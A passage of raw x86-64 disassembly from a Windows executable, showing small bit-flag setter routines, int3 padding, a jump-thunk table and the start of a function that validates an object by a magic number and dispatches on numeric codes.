   1400028f8:	cc                   	int3
   1400028f9:	cc                   	int3
   1400028fa:	cc                   	int3
   1400028fb:	cc                   	int3
   1400028fc:	cc                   	int3
   1400028fd:	cc                   	int3
   1400028fe:	cc                   	int3
   1400028ff:	cc                   	int3
   140002900:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002905:	57                   	push   %rdi
   140002906:	48 83 ec 20          	sub    $0x20,%rsp
   14000290a:	8b da                	mov    %edx,%ebx
   14000290c:	48 8b f9             	mov    %rcx,%rdi
   14000290f:	48 8d 05 da ea 12 00 	lea    0x12eada(%rip),%rax        # 0x1401313f0
   140002916:	48 89 01             	mov    %rax,(%rcx)
   140002919:	e8 1e be 08 00       	call   0x14008e73c
   14000291e:	90                   	nop
   14000291f:	f6 c3 01             	test   $0x1,%bl
   140002922:	74 0d                	je     0x140002931
   140002924:	ba 48 00 00 00       	mov    $0x48,%edx
   140002929:	48 8b cf             	mov    %rdi,%rcx
   14000292c:	e8 5f ba 0b 00       	call   0x1400be390
   140002931:	48 8b c7             	mov    %rdi,%rax
   140002934:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002939:	48 83 c4 20          	add    $0x20,%rsp
   14000293d:	5f                   	pop    %rdi
   14000293e:	c3                   	ret
   14000293f:	cc                   	int3
   140002940:	81 49 18 00 40 00 00 	orl    $0x4000,0x18(%rcx)
   140002947:	48 8b c1             	mov    %rcx,%rax
   14000294a:	c3                   	ret
   14000294b:	cc                   	int3
   14000294c:	cc                   	int3
   14000294d:	cc                   	int3
   14000294e:	cc                   	int3
   14000294f:	cc                   	int3
   140002950:	8b 41 18             	mov    0x18(%rcx),%eax
   140002953:	25 ff f3 ff ff       	and    $0xfffff3ff,%eax
   140002958:	0f ba e8 09          	bts    $0x9,%eax
   14000295c:	89 41 18             	mov    %eax,0x18(%rcx)
   14000295f:	48 8b c1             	mov    %rcx,%rax
   140002962:	c3                   	ret
   140002963:	cc                   	int3
   140002964:	cc                   	int3
   140002965:	cc                   	int3
   140002966:	cc                   	int3
   140002967:	cc                   	int3
   140002968:	cc                   	int3
   140002969:	cc                   	int3
   14000296a:	cc                   	int3
   14000296b:	cc                   	int3
   14000296c:	cc                   	int3
   14000296d:	cc                   	int3
   14000296e:	cc                   	int3
   14000296f:	cc                   	int3
   140002970:	81 61 18 ff cf ff ff 	andl   $0xffffcfff,0x18(%rcx)
   140002977:	48 8b c1             	mov    %rcx,%rax
   14000297a:	c3                   	ret
   14000297b:	cc                   	int3
   14000297c:	cc                   	int3
   14000297d:	cc                   	int3
   14000297e:	cc                   	int3
   14000297f:	cc                   	int3
   140002980:	8b 41 18             	mov    0x18(%rcx),%eax
   140002983:	0f ba f0 0c          	btr    $0xc,%eax
   140002987:	0f ba e8 0d          	bts    $0xd,%eax
   14000298b:	89 41 18             	mov    %eax,0x18(%rcx)
   14000298e:	48 8b c1             	mov    %rcx,%rax
   140002991:	c3                   	ret
   140002992:	cc                   	int3
   140002993:	cc                   	int3
   140002994:	cc                   	int3
   140002995:	cc                   	int3
   140002996:	cc                   	int3
   140002997:	cc                   	int3
   140002998:	cc                   	int3
   140002999:	cc                   	int3
   14000299a:	cc                   	int3
   14000299b:	cc                   	int3
   14000299c:	cc                   	int3
   14000299d:	cc                   	int3
   14000299e:	cc                   	int3
   14000299f:	cc                   	int3
   1400029a0:	8b 41 18             	mov    0x18(%rcx),%eax
   1400029a3:	25 ff f9 ff ff       	and    $0xfffff9ff,%eax
   1400029a8:	0f ba e8 0b          	bts    $0xb,%eax
   1400029ac:	89 41 18             	mov    %eax,0x18(%rcx)
   1400029af:	48 8b c1             	mov    %rcx,%rax
   1400029b2:	c3                   	ret
   1400029b3:	cc                   	int3
   1400029b4:	cc                   	int3
   1400029b5:	cc                   	int3
   1400029b6:	cc                   	int3
   1400029b7:	cc                   	int3
   1400029b8:	cc                   	int3
   1400029b9:	cc                   	int3
   1400029ba:	cc                   	int3
   1400029bb:	cc                   	int3
   1400029bc:	cc                   	int3
   1400029bd:	cc                   	int3
   1400029be:	cc                   	int3
   1400029bf:	cc                   	int3
   1400029c0:	8b 41 18             	mov    0x18(%rcx),%eax
   1400029c3:	25 3f ff ff ff       	and    $0xffffff3f,%eax
   1400029c8:	0f ba e8 08          	bts    $0x8,%eax
   1400029cc:	89 41 18             	mov    %eax,0x18(%rcx)
   1400029cf:	48 8b c1             	mov    %rcx,%rax
   1400029d2:	c3                   	ret
   1400029d3:	cc                   	int3
   1400029d4:	cc                   	int3
   1400029d5:	cc                   	int3
   1400029d6:	cc                   	int3
   1400029d7:	cc                   	int3
   1400029d8:	cc                   	int3
   1400029d9:	cc                   	int3
   1400029da:	cc                   	int3
   1400029db:	cc                   	int3
   1400029dc:	cc                   	int3
   1400029dd:	cc                   	int3
   1400029de:	cc                   	int3
   1400029df:	cc                   	int3
   1400029e0:	8b 41 18             	mov    0x18(%rcx),%eax
   1400029e3:	25 7f fe ff ff       	and    $0xfffffe7f,%eax
   1400029e8:	83 c8 40             	or     $0x40,%eax
   1400029eb:	89 41 18             	mov    %eax,0x18(%rcx)
   1400029ee:	48 8b c1             	mov    %rcx,%rax
   1400029f1:	c3                   	ret
   1400029f2:	cc                   	int3
   1400029f3:	cc                   	int3
   1400029f4:	cc                   	int3
   1400029f5:	cc                   	int3
   1400029f6:	cc                   	int3
   1400029f7:	cc                   	int3
   1400029f8:	cc                   	int3
   1400029f9:	cc                   	int3
   1400029fa:	cc                   	int3
   1400029fb:	cc                   	int3
   1400029fc:	cc                   	int3
   1400029fd:	cc                   	int3
   1400029fe:	cc                   	int3
   1400029ff:	cc                   	int3
   140002a00:	81 61 18 ff bf ff ff 	andl   $0xffffbfff,0x18(%rcx)
   140002a07:	48 8b c1             	mov    %rcx,%rax
   140002a0a:	c3                   	ret
   140002a0b:	cc                   	int3
   140002a0c:	cc                   	int3
   140002a0d:	cc                   	int3
   140002a0e:	cc                   	int3
   140002a0f:	cc                   	int3
   140002a10:	83 61 18 f7          	andl   $0xfffffff7,0x18(%rcx)
   140002a14:	48 8b c1             	mov    %rcx,%rax
   140002a17:	c3                   	ret
   140002a18:	cc                   	int3
   140002a19:	cc                   	int3
   140002a1a:	cc                   	int3
   140002a1b:	cc                   	int3
   140002a1c:	cc                   	int3
   140002a1d:	cc                   	int3
   140002a1e:	cc                   	int3
   140002a1f:	cc                   	int3
   140002a20:	83 61 18 ef          	andl   $0xffffffef,0x18(%rcx)
   140002a24:	48 8b c1             	mov    %rcx,%rax
   140002a27:	c3                   	ret
   140002a28:	cc                   	int3
   140002a29:	cc                   	int3
   140002a2a:	cc                   	int3
   140002a2b:	cc                   	int3
   140002a2c:	cc                   	int3
   140002a2d:	cc                   	int3
   140002a2e:	cc                   	int3
   140002a2f:	cc                   	int3
   140002a30:	83 61 18 df          	andl   $0xffffffdf,0x18(%rcx)
   140002a34:	48 8b c1             	mov    %rcx,%rax
   140002a37:	c3                   	ret
   140002a38:	cc                   	int3
   140002a39:	cc                   	int3
   140002a3a:	cc                   	int3
   140002a3b:	cc                   	int3
   140002a3c:	cc                   	int3
   140002a3d:	cc                   	int3
   140002a3e:	cc                   	int3
   140002a3f:	cc                   	int3
   140002a40:	83 61 18 fe          	andl   $0xfffffffe,0x18(%rcx)
   140002a44:	48 8b c1             	mov    %rcx,%rax
   140002a47:	c3                   	ret
   140002a48:	cc                   	int3
   140002a49:	cc                   	int3
   140002a4a:	cc                   	int3
   140002a4b:	cc                   	int3
   140002a4c:	cc                   	int3
   140002a4d:	cc                   	int3
   140002a4e:	cc                   	int3
   140002a4f:	cc                   	int3
   140002a50:	83 61 18 fd          	andl   $0xfffffffd,0x18(%rcx)
   140002a54:	48 8b c1             	mov    %rcx,%rax
   140002a57:	c3                   	ret
   140002a58:	cc                   	int3
   140002a59:	cc                   	int3
   140002a5a:	cc                   	int3
   140002a5b:	cc                   	int3
   140002a5c:	cc                   	int3
   140002a5d:	cc                   	int3
   140002a5e:	cc                   	int3
   140002a5f:	cc                   	int3
   140002a60:	83 61 18 fb          	andl   $0xfffffffb,0x18(%rcx)
   140002a64:	48 8b c1             	mov    %rcx,%rax
   140002a67:	c3                   	ret
   140002a68:	cc                   	int3
   140002a69:	cc                   	int3
   140002a6a:	cc                   	int3
   140002a6b:	cc                   	int3
   140002a6c:	cc                   	int3
   140002a6d:	cc                   	int3
   140002a6e:	cc                   	int3
   140002a6f:	cc                   	int3
   140002a70:	8b 41 18             	mov    0x18(%rcx),%eax
   140002a73:	25 ff f5 ff ff       	and    $0xfffff5ff,%eax
   140002a78:	0f ba e8 0a          	bts    $0xa,%eax
   140002a7c:	89 41 18             	mov    %eax,0x18(%rcx)
   140002a7f:	48 8b c1             	mov    %rcx,%rax
   140002a82:	c3                   	ret
   140002a83:	cc                   	int3
   140002a84:	cc                   	int3
   140002a85:	cc                   	int3
   140002a86:	cc                   	int3
   140002a87:	cc                   	int3
   140002a88:	cc                   	int3
   140002a89:	cc                   	int3
   140002a8a:	cc                   	int3
   140002a8b:	cc                   	int3
   140002a8c:	cc                   	int3
   140002a8d:	cc                   	int3
   140002a8e:	cc                   	int3
   140002a8f:	cc                   	int3
   140002a90:	8b 41 18             	mov    0x18(%rcx),%eax
   140002a93:	25 bf fe ff ff       	and    $0xfffffebf,%eax
   140002a98:	0f ba e8 07          	bts    $0x7,%eax
   140002a9c:	89 41 18             	mov    %eax,0x18(%rcx)
   140002a9f:	48 8b c1             	mov    %rcx,%rax
   140002aa2:	c3                   	ret
   140002aa3:	cc                   	int3
   140002aa4:	cc                   	int3
   140002aa5:	cc                   	int3
   140002aa6:	cc                   	int3
   140002aa7:	cc                   	int3
   140002aa8:	cc                   	int3
   140002aa9:	cc                   	int3
   140002aaa:	cc                   	int3
   140002aab:	cc                   	int3
   140002aac:	cc                   	int3
   140002aad:	cc                   	int3
   140002aae:	cc                   	int3
   140002aaf:	cc                   	int3
   140002ab0:	8b 41 18             	mov    0x18(%rcx),%eax
   140002ab3:	0f ba f0 0d          	btr    $0xd,%eax
   140002ab7:	0f ba e8 0c          	bts    $0xc,%eax
   140002abb:	89 41 18             	mov    %eax,0x18(%rcx)
   140002abe:	48 8b c1             	mov    %rcx,%rax
   140002ac1:	c3                   	ret
   140002ac2:	cc                   	int3
   140002ac3:	cc                   	int3
   140002ac4:	cc                   	int3
   140002ac5:	cc                   	int3
   140002ac6:	cc                   	int3
   140002ac7:	cc                   	int3
   140002ac8:	cc                   	int3
   140002ac9:	cc                   	int3
   140002aca:	cc                   	int3
   140002acb:	cc                   	int3
   140002acc:	cc                   	int3
   140002acd:	cc                   	int3
   140002ace:	cc                   	int3
   140002acf:	cc                   	int3
   140002ad0:	83 49 18 08          	orl    $0x8,0x18(%rcx)
   140002ad4:	48 8b c1             	mov    %rcx,%rax
   140002ad7:	c3                   	ret
   140002ad8:	cc                   	int3
   140002ad9:	cc                   	int3
   140002ada:	cc                   	int3
   140002adb:	cc                   	int3
   140002adc:	cc                   	int3
   140002add:	cc                   	int3
   140002ade:	cc                   	int3
   140002adf:	cc                   	int3
   140002ae0:	83 49 18 10          	orl    $0x10,0x18(%rcx)
   140002ae4:	48 8b c1             	mov    %rcx,%rax
   140002ae7:	c3                   	ret
   140002ae8:	cc                   	int3
   140002ae9:	cc                   	int3
   140002aea:	cc                   	int3
   140002aeb:	cc                   	int3
   140002aec:	cc                   	int3
   140002aed:	cc                   	int3
   140002aee:	cc                   	int3
   140002aef:	cc                   	int3
   140002af0:	83 49 18 20          	orl    $0x20,0x18(%rcx)
   140002af4:	48 8b c1             	mov    %rcx,%rax
   140002af7:	c3                   	ret
   140002af8:	cc                   	int3
   140002af9:	cc                   	int3
   140002afa:	cc                   	int3
   140002afb:	cc                   	int3
   140002afc:	cc                   	int3
   140002afd:	cc                   	int3
   140002afe:	cc                   	int3
   140002aff:	cc                   	int3
   140002b00:	83 49 18 01          	orl    $0x1,0x18(%rcx)
   140002b04:	48 8b c1             	mov    %rcx,%rax
   140002b07:	c3                   	ret
   140002b08:	cc                   	int3
   140002b09:	cc                   	int3
   140002b0a:	cc                   	int3
   140002b0b:	cc                   	int3
   140002b0c:	cc                   	int3
   140002b0d:	cc                   	int3
   140002b0e:	cc                   	int3
   140002b0f:	cc                   	int3
   140002b10:	83 49 18 02          	orl    $0x2,0x18(%rcx)
   140002b14:	48 8b c1             	mov    %rcx,%rax
   140002b17:	c3                   	ret
   140002b18:	cc                   	int3
   140002b19:	cc                   	int3
   140002b1a:	cc                   	int3
   140002b1b:	cc                   	int3
   140002b1c:	cc                   	int3
   140002b1d:	cc                   	int3
   140002b1e:	cc                   	int3
   140002b1f:	cc                   	int3
   140002b20:	83 49 18 04          	orl    $0x4,0x18(%rcx)
   140002b24:	48 8b c1             	mov    %rcx,%rax
   140002b27:	c3                   	ret
   140002b28:	cc                   	int3
   140002b29:	cc                   	int3
   140002b2a:	cc                   	int3
   140002b2b:	cc                   	int3
   140002b2c:	cc                   	int3
   140002b2d:	cc                   	int3
   140002b2e:	cc                   	int3
   140002b2f:	cc                   	int3
   140002b30:	40 53                	rex push %rbx
   140002b32:	48 83 ec 20          	sub    $0x20,%rsp
   140002b36:	48 8b d9             	mov    %rcx,%rbx
   140002b39:	48 8b ca             	mov    %rdx,%rcx
   140002b3c:	e8 bb f0 0d 00       	call   0x1400e1bfc
   140002b41:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002b44:	75 08                	jne    0x140002b4e
   140002b46:	32 c0                	xor    %al,%al
   140002b48:	48 83 c4 20          	add    $0x20,%rsp
   140002b4c:	5b                   	pop    %rbx
   140002b4d:	c3                   	ret
   140002b4e:	88 03                	mov    %al,(%rbx)
   140002b50:	b0 01                	mov    $0x1,%al
   140002b52:	48 83 c4 20          	add    $0x20,%rsp
   140002b56:	5b                   	pop    %rbx
   140002b57:	c3                   	ret
   140002b58:	cc                   	int3
   140002b59:	cc                   	int3
   140002b5a:	cc                   	int3
   140002b5b:	cc                   	int3
   140002b5c:	cc                   	int3
   140002b5d:	cc                   	int3
   140002b5e:	cc                   	int3
   140002b5f:	cc                   	int3
   140002b60:	48 83 ec 28          	sub    $0x28,%rsp
   140002b64:	0f be c9             	movsbl %cl,%ecx
   140002b67:	e8 d0 c1 0c 00       	call   0x1400ced3c
   140002b6c:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002b6f:	0f 95 c0             	setne  %al
   140002b72:	48 83 c4 28          	add    $0x28,%rsp
   140002b76:	c3                   	ret
   140002b77:	cc                   	int3
   140002b78:	cc                   	int3
   140002b79:	cc                   	int3
   140002b7a:	cc                   	int3
   140002b7b:	cc                   	int3
   140002b7c:	cc                   	int3
   140002b7d:	cc                   	int3
   140002b7e:	cc                   	int3
   140002b7f:	cc                   	int3
   140002b80:	48 83 ec 28          	sub    $0x28,%rsp
   140002b84:	0f b6 09             	movzbl (%rcx),%ecx
   140002b87:	e8 b0 fb 0d 00       	call   0x1400e273c
   140002b8c:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002b8f:	0f 95 c0             	setne  %al
   140002b92:	48 83 c4 28          	add    $0x28,%rsp
   140002b96:	c3                   	ret
   140002b97:	cc                   	int3
   140002b98:	cc                   	int3
   140002b99:	cc                   	int3
   140002b9a:	cc                   	int3
   140002b9b:	cc                   	int3
   140002b9c:	cc                   	int3
   140002b9d:	cc                   	int3
   140002b9e:	cc                   	int3
   140002b9f:	cc                   	int3
   140002ba0:	8b c1                	mov    %ecx,%eax
   140002ba2:	c3                   	ret
   140002ba3:	cc                   	int3
   140002ba4:	cc                   	int3
   140002ba5:	cc                   	int3
   140002ba6:	cc                   	int3
   140002ba7:	cc                   	int3
   140002ba8:	cc                   	int3
   140002ba9:	cc                   	int3
   140002baa:	cc                   	int3
   140002bab:	cc                   	int3
   140002bac:	cc                   	int3
   140002bad:	cc                   	int3
   140002bae:	cc                   	int3
   140002baf:	cc                   	int3
   140002bb0:	0f b6 c1             	movzbl %cl,%eax
   140002bb3:	83 f0 01             	xor    $0x1,%eax
   140002bb6:	c3                   	ret
   140002bb7:	cc                   	int3
   140002bb8:	cc                   	int3
   140002bb9:	cc                   	int3
   140002bba:	cc                   	int3
   140002bbb:	cc                   	int3
   140002bbc:	cc                   	int3
   140002bbd:	cc                   	int3
   140002bbe:	cc                   	int3
   140002bbf:	cc                   	int3
   140002bc0:	8b 41 0c             	mov    0xc(%rcx),%eax
   140002bc3:	ff c8                	dec    %eax
   140002bc5:	81 79 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rcx)
   140002bcc:	75 0a                	jne    0x140002bd8
   140002bce:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140002bd3:	77 03                	ja     0x140002bd8
   140002bd5:	b0 01                	mov    $0x1,%al
   140002bd7:	c3                   	ret
   140002bd8:	32 c0                	xor    %al,%al
   140002bda:	c3                   	ret
   140002bdb:	cc                   	int3
   140002bdc:	cc                   	int3
   140002bdd:	cc                   	int3
   140002bde:	cc                   	int3
   140002bdf:	cc                   	int3
   140002be0:	e9 5b 24 00 00       	jmp    0x140005040
   140002be5:	cc                   	int3
   140002be6:	cc                   	int3
   140002be7:	cc                   	int3
   140002be8:	cc                   	int3
   140002be9:	cc                   	int3
   140002bea:	cc                   	int3
   140002beb:	cc                   	int3
   140002bec:	cc                   	int3
   140002bed:	cc                   	int3
   140002bee:	cc                   	int3
   140002bef:	cc                   	int3
   140002bf0:	e9 0b 21 00 00       	jmp    0x140004d00
   140002bf5:	cc                   	int3
   140002bf6:	cc                   	int3
   140002bf7:	cc                   	int3
   140002bf8:	cc                   	int3
   140002bf9:	cc                   	int3
   140002bfa:	cc                   	int3
   140002bfb:	cc                   	int3
   140002bfc:	cc                   	int3
   140002bfd:	cc                   	int3
   140002bfe:	cc                   	int3
   140002bff:	cc                   	int3
   140002c00:	e9 5b 35 00 00       	jmp    0x140006160
   140002c05:	cc                   	int3
   140002c06:	cc                   	int3
   140002c07:	cc                   	int3
   140002c08:	cc                   	int3
   140002c09:	cc                   	int3
   140002c0a:	cc                   	int3
   140002c0b:	cc                   	int3
   140002c0c:	cc                   	int3
   140002c0d:	cc                   	int3
   140002c0e:	cc                   	int3
   140002c0f:	cc                   	int3
   140002c10:	e9 0b 32 00 00       	jmp    0x140005e20
   140002c15:	cc                   	int3
   140002c16:	cc                   	int3
   140002c17:	cc                   	int3
   140002c18:	cc                   	int3
   140002c19:	cc                   	int3
   140002c1a:	cc                   	int3
   140002c1b:	cc                   	int3
   140002c1c:	cc                   	int3
   140002c1d:	cc                   	int3
   140002c1e:	cc                   	int3
   140002c1f:	cc                   	int3
   140002c20:	e9 cb 3d 00 00       	jmp    0x1400069f0
   140002c25:	cc                   	int3
   140002c26:	cc                   	int3
   140002c27:	cc                   	int3
   140002c28:	cc                   	int3
   140002c29:	cc                   	int3
   140002c2a:	cc                   	int3
   140002c2b:	cc                   	int3
   140002c2c:	cc                   	int3
   140002c2d:	cc                   	int3
   140002c2e:	cc                   	int3
   140002c2f:	cc                   	int3
   140002c30:	e9 7b 3a 00 00       	jmp    0x1400066b0
   140002c35:	cc                   	int3
   140002c36:	cc                   	int3
   140002c37:	cc                   	int3
   140002c38:	cc                   	int3
   140002c39:	cc                   	int3
   140002c3a:	cc                   	int3
   140002c3b:	cc                   	int3
   140002c3c:	cc                   	int3
   140002c3d:	cc                   	int3
   140002c3e:	cc                   	int3
   140002c3f:	cc                   	int3
   140002c40:	e9 8b 2c 00 00       	jmp    0x1400058d0
   140002c45:	cc                   	int3
   140002c46:	cc                   	int3
   140002c47:	cc                   	int3
   140002c48:	cc                   	int3
   140002c49:	cc                   	int3
   140002c4a:	cc                   	int3
   140002c4b:	cc                   	int3
   140002c4c:	cc                   	int3
   140002c4d:	cc                   	int3
   140002c4e:	cc                   	int3
   140002c4f:	cc                   	int3
   140002c50:	e9 3b 29 00 00       	jmp    0x140005590
   140002c55:	cc                   	int3
   140002c56:	cc                   	int3
   140002c57:	cc                   	int3
   140002c58:	cc                   	int3
   140002c59:	cc                   	int3
   140002c5a:	cc                   	int3
   140002c5b:	cc                   	int3
   140002c5c:	cc                   	int3
   140002c5d:	cc                   	int3
   140002c5e:	cc                   	int3
   140002c5f:	cc                   	int3
   140002c60:	e9 db 03 00 00       	jmp    0x140003040
   140002c65:	cc                   	int3
   140002c66:	cc                   	int3
   140002c67:	cc                   	int3
   140002c68:	cc                   	int3
   140002c69:	cc                   	int3
   140002c6a:	cc                   	int3
   140002c6b:	cc                   	int3
   140002c6c:	cc                   	int3
   140002c6d:	cc                   	int3
   140002c6e:	cc                   	int3
   140002c6f:	cc                   	int3
   140002c70:	e9 6b 00 00 00       	jmp    0x140002ce0
   140002c75:	cc                   	int3
   140002c76:	cc                   	int3
   140002c77:	cc                   	int3
   140002c78:	cc                   	int3
   140002c79:	cc                   	int3
   140002c7a:	cc                   	int3
   140002c7b:	cc                   	int3
   140002c7c:	cc                   	int3
   140002c7d:	cc                   	int3
   140002c7e:	cc                   	int3
   140002c7f:	cc                   	int3
   140002c80:	e9 db 13 00 00       	jmp    0x140004060
   140002c85:	cc                   	int3
   140002c86:	cc                   	int3
   140002c87:	cc                   	int3
   140002c88:	cc                   	int3
   140002c89:	cc                   	int3
   140002c8a:	cc                   	int3
   140002c8b:	cc                   	int3
   140002c8c:	cc                   	int3
   140002c8d:	cc                   	int3
   140002c8e:	cc                   	int3
   140002c8f:	cc                   	int3
   140002c90:	e9 6b 10 00 00       	jmp    0x140003d00
   140002c95:	cc                   	int3
   140002c96:	cc                   	int3
   140002c97:	cc                   	int3
   140002c98:	cc                   	int3
   140002c99:	cc                   	int3
   140002c9a:	cc                   	int3
   140002c9b:	cc                   	int3
   140002c9c:	cc                   	int3
   140002c9d:	cc                   	int3
   140002c9e:	cc                   	int3
   140002c9f:	cc                   	int3
   140002ca0:	e9 cb 1b 00 00       	jmp    0x140004870
   140002ca5:	cc                   	int3
   140002ca6:	cc                   	int3
   140002ca7:	cc                   	int3
   140002ca8:	cc                   	int3
   140002ca9:	cc                   	int3
   140002caa:	cc                   	int3
   140002cab:	cc                   	int3
   140002cac:	cc                   	int3
   140002cad:	cc                   	int3
   140002cae:	cc                   	int3
   140002caf:	cc                   	int3
   140002cb0:	e9 5b 18 00 00       	jmp    0x140004510
   140002cb5:	cc                   	int3
   140002cb6:	cc                   	int3
   140002cb7:	cc                   	int3
   140002cb8:	cc                   	int3
   140002cb9:	cc                   	int3
   140002cba:	cc                   	int3
   140002cbb:	cc                   	int3
   140002cbc:	cc                   	int3
   140002cbd:	cc                   	int3
   140002cbe:	cc                   	int3
   140002cbf:	cc                   	int3
   140002cc0:	e9 8b 0b 00 00       	jmp    0x140003850
   140002cc5:	cc                   	int3
   140002cc6:	cc                   	int3
   140002cc7:	cc                   	int3
   140002cc8:	cc                   	int3
   140002cc9:	cc                   	int3
   140002cca:	cc                   	int3
   140002ccb:	cc                   	int3
   140002ccc:	cc                   	int3
   140002ccd:	cc                   	int3
   140002cce:	cc                   	int3
   140002ccf:	cc                   	int3
   140002cd0:	e9 1b 08 00 00       	jmp    0x1400034f0
   140002cd5:	cc                   	int3
   140002cd6:	cc                   	int3
   140002cd7:	cc                   	int3
   140002cd8:	cc                   	int3
   140002cd9:	cc                   	int3
   140002cda:	cc                   	int3
   140002cdb:	cc                   	int3
   140002cdc:	cc                   	int3
   140002cdd:	cc                   	int3
   140002cde:	cc                   	int3
   140002cdf:	cc                   	int3
   140002ce0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002ce5:	55                   	push   %rbp
   140002ce6:	56                   	push   %rsi
   140002ce7:	57                   	push   %rdi
   140002ce8:	48 8b ec             	mov    %rsp,%rbp
   140002ceb:	48 83 ec 50          	sub    $0x50,%rsp
   140002cef:	48 8b f2             	mov    %rdx,%rsi
   140002cf2:	45 33 db             	xor    %r11d,%r11d
   140002cf5:	41 8b db             	mov    %r11d,%ebx
   140002cf8:	48 85 c9             	test   %rcx,%rcx
   140002cfb:	0f 94 c3             	sete   %bl
   140002cfe:	48 85 c9             	test   %rcx,%rcx
   140002d01:	75 1e                	jne    0x140002d21
   140002d03:	48 8d 15 ae ba 12 00 	lea    0x12baae(%rip),%rdx        # 0x14012e7b8
   140002d0a:	e8 c1 71 00 00       	call   0x140009ed0
   140002d0f:	8b c3                	mov    %ebx,%eax
   140002d11:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002d18:	00 
   140002d19:	48 83 c4 50          	add    $0x50,%rsp
   140002d1d:	5f                   	pop    %rdi
   140002d1e:	5e                   	pop    %rsi
   140002d1f:	5d                   	pop    %rbp
   140002d20:	c3                   	ret
   140002d21:	41 8b db             	mov    %r11d,%ebx
   140002d24:	48 85 f6             	test   %rsi,%rsi
   140002d27:	0f 94 c3             	sete   %bl
   140002d2a:	48 85 f6             	test   %rsi,%rsi
   140002d2d:	75 1e                	jne    0x140002d4d
   140002d2f:	48 8d 15 aa ba 12 00 	lea    0x12baaa(%rip),%rdx        # 0x14012e7e0
   140002d36:	e8 95 71 00 00       	call   0x140009ed0
   140002d3b:	8b c3                	mov    %ebx,%eax
   140002d3d:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140002d44:	00 
   140002d45:	48 83 c4 50          	add    $0x50,%rsp
   140002d49:	5f                   	pop    %rdi
   140002d4a:	5e                   	pop    %rsi
   140002d4b:	5d                   	pop    %rbp
   140002d4c:	c3                   	ret
   140002d4d:	48 8b 11             	mov    (%rcx),%rdx
   140002d50:	48 85 d2             	test   %rdx,%rdx
   140002d53:	0f 84 c6 02 00 00    	je     0x14000301f
   140002d59:	8b 42 0c             	mov    0xc(%rdx),%eax
   140002d5c:	ff c8                	dec    %eax
   140002d5e:	81 7a 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rdx)
   140002d65:	0f 85 b4 02 00 00    	jne    0x14000301f
   140002d6b:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140002d70:	0f 87 a9 02 00 00    	ja     0x14000301f
   140002d76:	44 8b 49 0c          	mov    0xc(%rcx),%r9d
   140002d7a:	41 8b db             	mov    %r11d,%ebx
   140002d7d:	89 5d e0             	mov    %ebx,-0x20(%rbp)
   140002d80:	44 89 5d e4          	mov    %r11d,-0x1c(%rbp)
   140002d84:	44 89 4d e8          	mov    %r9d,-0x18(%rbp)
   140002d88:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140002d8c:	8b 41 08             	mov    0x8(%rcx),%eax
   140002d8f:	3d 41 9c 00 00       	cmp    $0x9c41,%eax
   140002d94:	0f 87 7f 01 00 00    	ja     0x140002f19
   140002d9a:	0f 84 19 01 00 00    	je     0x140002eb9
   140002da0:	2d 20 4e 00 00       	sub    $0x4e20,%eax
   140002da5:	0f 84 a8 00 00 00    	je     0x140002e53
   140002dab:	83 e8 01             	sub    $0x1,%eax
   140002dae:	74 40                	je     0x140002df0
   140002db0:	83 e8 01             	sub    $0x1,%eax
   140002db3:	74 23                	je     0x140002dd8
   140002db5:	3d 1e 4e 00 00       	cmp    $0x4e1e,%eax
   140002dba:	0f 85 74 01 00 00    	jne    0x140002f34
   140002dc0:	48 8d 51 38          	lea    0x38(%rcx),%rdx
   140002dc4:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140002dc8:	e8 13 77 00 00       	call   0x14000a4e0
   140002dcd:	44 8b d8             	mov    %eax,%r11d
   140002dd0:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   140002dd3:	e9 1d 01 00 00       	jmp    0x140002ef5
   140002dd8:	48 8d 51 38          	lea    0x38(%rcx),%rdx
   140002ddc:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140002de0:	e8 2b 73 00 00       	call   0x14000a110
   140002de5:	44 8b d8             	mov    %eax,%r11d
   140002de8:	8b 5d e0             	mov    -0x20(%rbp),%ebx
   140002deb:	e9 05 01 00 00       	jmp    0x140002ef5
   140002df0:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140002df4:	48 8b 51 38          	mov    0x38(%rcx),%rdx
   140002df8:	48 85 d2             	test   %rdx,%rdx
   140002dfb:	74 36                	je     0x140002e33
   140002dfd:	8b 42 0c             	mov    0xc(%rdx),%eax
   140002e00:	ff c8                	dec    %eax
   140002e02:	81 7a 08 c4 d3 e2 f1 	cmpl   $0xf1e2d3c4,0x8(%rdx)
   140002e09:	75 28                	jne    0x140002e33
   140002e0b:	3d 50 c3 00 00       	cmp    $0xc350,%eax
   140002e10:	77 21                	ja     0x140002e33
   140002e12:	38 59 48             	cmp    %bl,0x48(%rcx)
   140002e15:	74 0a                	je     0x140002e21
   140002e17:	bb 10 00 00 00       	mov    $0x10,%ebx
   140002e1c:	e9 d4 00 00 00       	jmp    0x140002ef5
   140002e21:	48 8b 41 40          	mov    0x40(%rcx),%rax
   140002e25:	48 89 42 48          	mov    %rax,0x48(%rdx)
   140002e29:	bb 50 00 00 00       	mov    $0x50,%ebx
   140002e2e:	e9 c2 00 00 00       	jmp    0x140002ef5
   140002e33:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%rbp)
   140002e3a:	4c 8d 05 cf ba 12 00 	lea    0x12bacf(%rip),%r8        # 0x14012e910
   140002e41:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140002e45:	e8 c6 c1 00 00       	call   0x14000f010
   140002e4a:	44 8b 5d d0          	mov    -0x30(%rbp),%r11d
   140002e4e:	e9 a2 00 00 00       	jmp    0x140002ef5
   140002e53:	4c 8d 41 38          	lea    0x38(%rcx),%r8
   140002e57:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
   140002e5b:	49 8b 08             	mov    (%r8),%rcx
